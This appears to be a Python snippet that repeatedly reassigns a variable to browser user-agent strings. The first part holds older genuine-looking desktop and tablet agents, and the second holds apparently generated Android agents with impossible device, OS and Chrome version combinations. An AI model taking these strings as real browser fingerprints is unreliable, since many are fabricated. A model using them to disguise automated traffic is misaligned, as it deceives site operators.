ua = ["Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",]
ua = ["Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Linux x86_64; rv:34.0) Gecko/20100101 Firefox/34.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/8.0 Safari/600.1.25",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSOWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3",]
ua = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B435 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",]
ua = ["Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4",]
ua = ["Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",]
ua = ["Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.0; Touch; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",]
ua = ["Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",]
ua = ["Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",]
ua = ["Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",]
ua = ["Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.4319.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.5187.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.3989.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4503.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.5613.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4223.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.3023.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3351.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.4042.85 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.3513.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.4917.95 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4589.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4245.92 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.3913.66 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.5008.51 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4743.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.4085.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4947.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.4458.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.4107.32 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.4155.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4693.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4024.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4286.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5829.92 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.5879.23 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4641.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5186.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.5051.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.3479.60 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.5503.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.5150.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.3848.40 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3946.62 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3348.31 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.3825.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.4495.23 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.4148.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4961.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.4657.26 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5843.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4223.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.4604.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.3699.84 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.3357.47 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.4760.69 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5983.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.3127.65 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.3816.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4597.49 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.4299.76 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.4130.28 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.5525.56 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4586.24 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4419.73 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.3963.42 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4395.63 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.0.3403.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3401.68 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3370.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.4154.99 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3535.78 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5808.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5035.21 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.4450.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J320Y Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.5156.94 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.4818.89 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.4690.55 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.5570.82 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5685.90 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.5545.54 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.5062.97 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/47.0.5806.61 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.5747.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.3533.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.4892.22 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.4351.72 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3218.91 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4136.43 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-N986U Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3300.50 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320P Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.4328.79 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.4494.52 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-J3109 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.5344.37 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.5267.35 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 15; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.5526.27 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8; SM-J320F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.5787.30 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-J320H Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5921.86 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; J320FN Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.4523.48 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-J320G Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.4174.53 Mobile Safari/537.36",]
